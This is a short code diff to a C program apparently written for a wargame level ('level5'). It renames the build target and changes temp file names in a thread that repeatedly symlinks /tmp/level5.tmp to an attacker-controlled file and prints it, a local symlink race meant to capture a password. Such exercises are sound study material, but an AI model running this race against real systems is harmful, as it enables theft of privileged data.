@@ -4,8 +4,8 @@
 
 /*
         Complie Option: -pthread
-        # gcc -o Attack_Target Attack_Target2.c -pthread
-        # ./Attack_Target
+        # gcc -o AttackTarget_Thread AttackTarget_Thread.c -pthread
+        # ./AttackTarget_Thread
 */
 
 void *exec_cmd();
@@ -46,12 +46,12 @@ void *exec_cmd()
 void *exec_race()
 {
 	int i;
-	system("touch /tmp/18pass.txt");
+	system("touch /tmp/5pass.txt");
 	for(i=0; i<10; i++)
 	{
-	        system("ln -s /tmp/18pass.txt /tmp/level5.tmp &");
+	        system("ln -s /tmp/5pass.txt /tmp/level5.tmp &");
 	        printf("=========== Sucessfully create link !!! ========\n");
-	        system("cat /tmp/18pass.txt");
+	        system("cat /tmp/5pass.txt");
 	}
 	exit(0);
 }
